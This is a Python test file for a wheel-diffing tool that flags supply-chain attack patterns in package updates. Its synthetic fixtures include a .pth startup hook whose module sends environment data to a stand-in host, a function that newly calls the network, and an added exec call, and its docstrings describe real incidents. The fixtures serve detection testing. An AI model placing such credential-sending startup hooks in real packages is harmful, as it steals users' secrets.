"""Tests for algobank/diff.py on synthetic wheels that reproduce real attack patterns.
Run: python3.14 -I v0.1/test_diff.py

The wheels are built in a temporary directory and only parsed; nothing is installed or run.
"""
import os, sys, tempfile, zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from algobank import diff as ad

BASE = {
    "demo/__init__.py": "from .util import fmt\n",
    "demo/util.py": "def fmt(s):\n    return s.upper()\n",
}
META = "Metadata-Version: 2.1\nName: demo\nVersion: {v}\nRequires-Dist: idna (>=2)\n"

def wheel(tmp, version, files, meta=None):
    path = os.path.join(tmp, f"demo-{version}-py3-none-any.whl")
    with zipfile.ZipFile(path, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
        z.writestr(f"demo-{version}.dist-info/METADATA", meta or META.format(v=version))
    return path

def run_diff(old_files, new_files, new_meta=None):
    with tempfile.TemporaryDirectory() as tmp:
        a = ad.analyze(ad.load(wheel(tmp, "1.0", old_files)))
        b = ad.analyze(ad.load(wheel(tmp, "1.1", new_files, new_meta)))
        return ad.diff_report(a, b)

def high(r): return [x for x in r["findings"] if x["severity"] == "high"]
def kinds(r, sev=("high", "medium")): return {x["kind"] for x in r["findings"] if x["severity"] in sev}

def test_clean_update_is_quiet():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    return s.upper() + '!'\n"})
    r = run_diff(BASE, new)
    assert r["nodes"]["code_changed"] == 1
    assert not kinds(r), r["findings"]

def test_startup_hook():
    """LiteLLM 1.107.0: a .pth file and a module that read credentials and send them out."""
    new = dict(BASE, **{
        "demo_init.pth": "import demo._boot\n",
        "demo/_boot.py": "import os, urllib.request\n\n"
                         "def send():\n    urllib.request.urlopen('https://example.invalid', data=os.environ.get('HOME', '').encode())\n",
    })
    r = run_diff(BASE, new)
    texts = " ".join(x["text"] for x in high(r))
    assert "demo_init.pth" in texts and "every Python start" in texts
    assert "network" in texts and "env" in texts

def test_existing_function_gains_network():
    """chalk/debug: an existing formatting function starts using the network."""
    new = dict(BASE, **{"demo/util.py": "import urllib.request\n\ndef fmt(s):\n"
                                        "    urllib.request.urlopen('https://example.invalid')\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    x = next(x for x in high(r) if "network" in x["text"])
    assert "demo.util:fmt" in x["nodes"]

def test_new_dynamic_exec():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    exec(s)\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    assert any("eval, exec" in x["text"] for x in high(r))

def test_new_native_binary():
    new = dict(BASE, **{"demo/_speedups.so": b"\x7fELF not really"})
    r = run_diff(BASE, new)
    assert any(x["kind"] == "native" for x in high(r))

def test_new_dependency():
    """axios 1.14.1 added one dependency, plain-crypto-js, which carried the malware."""
    meta = META.format(v="1.1") + "Requires-Dist: plain-crypto-js\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency plain_crypto_js" in x["text"] and "TOP" in x["text"] for x in high(r))

def test_new_optional_dependency_is_high():
    """Test-only and optional dependencies bring unanalyzed code too: setuptools in a test extra
    reaches the environment and files if anything uses it in production."""
    meta = META.format(v="1.1") + "Requires-Dist: setuptools ; extra == 'testing'\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency setuptools" in x["text"] for x in high(r))

def test_dependency_formatting_is_not_a_change():
    meta = "Metadata-Version: 2.1\nName: demo\nVersion: 1.1\nRequires-Dist: idna >=2\n"
    r = run_diff(BASE, BASE, meta)
    assert not r["findings"], r["findings"]

def test_exit_status():
    with tempfile.TemporaryDirectory() as tmp:
        old = wheel(tmp, "1.0", BASE)
        hooked = wheel(tmp, "1.1", dict(BASE, **{"x.pth": "import demo\n"}))
        assert ad.main(["diff", old, old]) == 0
        assert ad.main(["diff", old, hooked]) == 1
        assert ad.main(["diff", old, os.path.join(tmp, "missing.whl")]) == 2
        assert ad.main(["scope", old]) == 0

def test_sdist_is_high():
    """Installing an sdist runs its build backend, and pip download runs it to read the metadata."""
    import io, tarfile
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "demo-1.1.tar.gz")
        with tarfile.open(path, "w:gz") as t:
            for name, data in dict(BASE, **{"PKG-INFO": META.format(v="1.1")}).items():
                info = tarfile.TarInfo("demo-1.1/" + name); info.size = len(data.encode())
                t.addfile(info, io.BytesIO(data.encode()))
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["kind"] == "sdist" and "TOP" in x["text"] for x in high(r))
        assert ad.main(["scope", path]) == 1

def test_no_network_no_writes():
    """Algobank's own scope: it only reads the files it is given."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    files = {}
    for f in ("__init__.py", "__main__.py", "diff.py", "pkgmerkle.py"):
        with open(os.path.join(root, "algobank", f)) as fh:
            files["algobank/" + f] = fh.read()
    scope = set(ad.Package(files).scope())
    assert scope <= {"file"}, scope

if __name__ == "__main__":
    import contextlib, io
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        with contextlib.redirect_stdout(io.StringIO()):
            t()
        print("ok  ", t.__name__)
    print(f"{len(tests)} tests passed")
